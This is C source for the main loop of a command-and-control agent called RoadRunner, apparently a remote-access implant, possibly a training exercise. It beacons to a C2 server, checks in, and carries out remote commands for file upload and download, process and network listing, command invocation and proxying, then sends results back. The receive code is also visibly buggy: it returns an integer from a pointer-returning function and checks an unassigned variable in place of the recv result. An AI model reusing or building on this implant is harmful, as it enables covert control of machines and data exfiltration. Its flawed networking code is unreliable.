/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */

#define _GNU_SOURCE
// include what we need for the functionality
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>

// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);

/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    // RR_DEBUG_PRINT("\n------------------------ main ------------------------");   
    // call our hello world function
    // say_hello();

    // Agent logic
        // connect
        // Send checkin
        // Recieve
        // perform command
        // send response

    // while
        //while
            // get cmd
            // do cmd
            // respond
            // if shutdown
                //break
        // if shutdown
            //break

    bool not_shutdown = true;
    int fd = 0;
    Response *rsp = NULL;
    Command *cmd = NULL;

    while (not_shutdown){

        // inner loop to continue calling until it gets a connection to the server
        // it'll exit the inner (fd will be greater than one and shutdown nwas not sent) and will have sent the checkin 
        while (not_shutdown && fd < 1){

            // get the file descriptor and connect
            fd = connect_to_server();

            // if got a connection, then send a checkin else sleep for a bit
            if (fd > 0){
                // get/create the checkin response (first thing being send per protocol)
                rsp = checkin_command();
                // send the checkin
                send_response(fd, rsp);
            }
            else{
                sleep(SLEEP_INTERVAL);
            }
        }
        // obtain the command
        cmd = receive_command(fd);

        if (!cmd){
            close(fd);
            fd = 0;
            continue;
        }
        
        // perform the command and get the response back
        not_shutdown = perform_command(cmd, &rsp);
        // printf("\n  rsp->msg_len: %d", rsp->msg_len);
        // printf("\n  rsp->msg: %s", rsp->msg);

        free_command(cmd);

        // send back the response
        send_response(fd, rsp);
    }

    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    bool not_shutdown = true;
    char* command = cmd->cmd;

    // perform an "if else" tree checking the command against all known command strings
    if ((strcmp(command, "shutdown")) == 0){
        RR_DEBUG_PRINT("\n  received: shutdown command\n");
        not_shutdown = false;
        *rsp_out = alloc_response(0, "shutting down", 14);
    }
    else{
        not_shutdown = true;

        if ((strcmp(command, "invoke")) == 0){
            RR_DEBUG_PRINT("\n  received: invoke command\n");
            *rsp_out = invoke_command(cmd);
        }
        else if (((strcmp(command, "sleep")) == 0)){
            RR_DEBUG_PRINT("\n  received: sleep command\n");
            *rsp_out = sleep_command(cmd);
        }
        else if (((strcmp(command, "download")) == 0)){
            RR_DEBUG_PRINT("\n    received: download command\n");
            *rsp_out = download_file_command(cmd);
        }
        else if (((strcmp(command, "upload")) == 0)){
            RR_DEBUG_PRINT("\n    received: upload command\n");
            *rsp_out = upload_file_command(cmd);
        }
        else if (((strcmp(command, "hostname")) == 0)){
            RR_DEBUG_PRINT("\n    received: hostname command\n");
            *rsp_out = hostname_command(cmd);
        }
        else if (((strcmp(command, "proclist")) == 0)){
            RR_DEBUG_PRINT("\n    received: process list command\n");
            *rsp_out = process_list_command(cmd);
        }
        else if (((strcmp(command, "netstat")) == 0)){
            RR_DEBUG_PRINT("\n    received: netstat command\n");
            *rsp_out = get_netstat_command(cmd);
        }
        else if (((strcmp(command, "proxy")) == 0)){
            RR_DEBUG_PRINT("\n    received: proxy command\n");
            *rsp_out = proxy_command(cmd);
        }
    }


    // need to know if we need to continue running after executing the command
    // shutdown command is the only one to actually stop the agent
    // RR_DEBUG_PRINT("received: shutdown command\n")
    // RR_DEBUG_PRINT("received: sleep command\n")
    // RR_DEBUG_PRINT("received: download command\n")
    // RR_DEBUG_PRINT("received: upload command\n")
    // RR_DEBUG_PRINT("received: hostname command\n")
    // RR_DEBUG_PRINT("received: process list command\n")
    // RR_DEBUG_PRINT("received: netstat command\n")
    // RR_DEBUG_PRINT("received: invoke command\n")
    // RR_DEBUG_PRINT("received: proxy command\n")

    return not_shutdown;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server.
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    char *c_stream;
    int i_stream_size = 0;

    // Serialize response
    i_stream_size = serialize_response(rsp, &c_stream);

    // Mmmake surc_stream is null-terminated even though I calloc'd it (valgrind was complaining)
    c_stream[i_stream_size-1] = 0;

    RR_DEBUG_PRINT("\n  send_response{serialize}: i_stream_size/message size: %d", i_stream_size); // total size of the response being sent

    // Send Response
    int totalTransmitted = 0;
    int bytesTransmitted = 0;
    while(totalTransmitted < i_stream_size){

        bytesTransmitted = write(sock_fd,
                                c_stream+totalTransmitted,
                               i_stream_size-totalTransmitted
        );

    if(bytesTransmitted == -1){
           fprintf(	stderr, "Error: Write() -> %d\n",bytesTransmitted);
           return false;
       }

    totalTransmitted += bytesTransmitted;
    }

    checkfree(c_stream);
    free_response(rsp);


    return true;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    char* msg_size_bytes = (char*) calloc(4, sizeof(char));
    uint32_t msg_size = 0;
    uint32_t mem_offset = 0;
    int bytesTransmitted = 0;
    char *dataBuffer = NULL;

    // Read from socket the first four bytes (i.e the message_size)
    bytesTransmitted = recv(sock_fd,
                            msg_size_bytes,
                            sizeof(uint32_t), 
                            0
    );

    if(bytesTransmitted == -1){
       fprintf(	stderr,
                "Error: Recv() -> %d.\n", 
                bytesTransmitted
        );

       return -3;
    }

    // convert the message to host bytes so we can use it
    memcpy(&msg_size, msg_size_bytes, sizeof(uint32_t));
    uint32_t msg_size_int = ntohl(msg_size);
    RR_DEBUG_PRINT("\n  receive_command{deserialize}: msg_size_int/sending: %d", msg_size_int);


    // init the buffer that will hold all the recvd data
    dataBuffer = (char*) calloc(msg_size_int, sizeof(char));

    // copy the msg_size_bytes into the data buffer and increment the mem_offset by four (size of the int bytes)
    // memcpy(p_command_array, msg_stream+mem_offset,i_command_length_ntohl);
    memcpy(dataBuffer, msg_size_bytes, sizeof(uint32_t));
    mem_offset = mem_offset + 4;

    // rev the rest of the data
    int secondBytesTransmitted = 0;
    // put the data in the datBuffer however at the correct point/offset. Also read in only the remaining amount of bytes (size-4)
    bytesTransmitted = recv(sock_fd,
                            dataBuffer+mem_offset,
                            msg_size_int-4, 
                            0
    );

    if(secondBytesTransmitted == -1){
       fprintf(	stderr,
                "Error: Recv() -> %d.\n", 
                bytesTransmitted
        );

       return -3;
    }


    // close(sock_fd); // TODO: find out if I need this?



    // Validate message
    // deserialize the command received from the server
    cmd = deserialize_command(msg_size_int, dataBuffer);
    // Command *deserialize_command(uint32_t  msg_size, char *msg_stream)

    checkfree(dataBuffer);
    checkfree(msg_size_bytes);
    return cmd;
}


/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    struct addrinfo* servInfo; // linked list results of possible bind interfaces
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family     = AF_UNSPEC;
    hints.ai_socktype   = SOCK_STREAM;

    // Getaddrinfo is called to fill out servInfo with a list of potential bind interfaces.
    int errCode = getaddrinfo(HOST, PORT, &hints, &servInfo);
    // if something went wrong with getting the addr info then return error and exit. If sucessful then contine as 
    if(errCode != 0){
        fprintf(stderr, "Error: GetAddrinfo -> %s\n", gai_strerror(errCode));
       return -1;
    }

    // pointer to iterate through the servInfo linked list
    struct addrinfo* pIter; 
    // file descriptor to store the socket (will be returned at the end)
    int socketFileDescriptor;

    // Loop through the servInfo linked list, which has the list of all possible bind interfaces
    // all the below attempt (socket, connect) will be attempted on each bind interface until we get one that works
    for(pIter = servInfo; pIter != NULL; pIter = pIter->ai_next){

        // init a the file descriptor
        socketFileDescriptor = socket(
            pIter->ai_family,
            pIter->ai_socktype,
            pIter->ai_protocol
        );

        // if for some reason the file descriptor could not get a ssocket then return error otherwise keep going
        if(socketFileDescriptor == -1){
           fprintf(	stderr, "Error: Socket() -> %d\n", socketFileDescriptor);
            // coninute to the cycle or bind interface in the linked list as this one failed
           continue;  

        }

        // attempt to connect to it
        errCode = connect(	
            socketFileDescriptor,
            pIter->ai_addr, 
            pIter->ai_addrlen
        );
    // if for some reason the connect did not work then return error otherwise keep going
        if(errCode == -1){
           fprintf(stderr, "Error: Connect() -> %d\n", errCode);
           close(socketFileDescriptor);
           continue;
        }
        break; // at this point we have a valid connection as any bad connect would've already returned
    }
    // if the pIter is NULL then the connection failed
    if(pIter == NULL){
       fprintf(stderr, "Error: Connect() failed.");
       return -2;

    }

    // craft the host string
    char hostString[INET6_ADDRSTRLEN] = {'\0'};

    inet_ntop(pIter->ai_family,
            pIter->ai_addr->sa_data,
            hostString,
            sizeof(hostString)
    );
    printf("C\n connect_to_server: Connecting to %s\n", hostString);
    freeaddrinfo(servInfo);

    return socketFileDescriptor;
}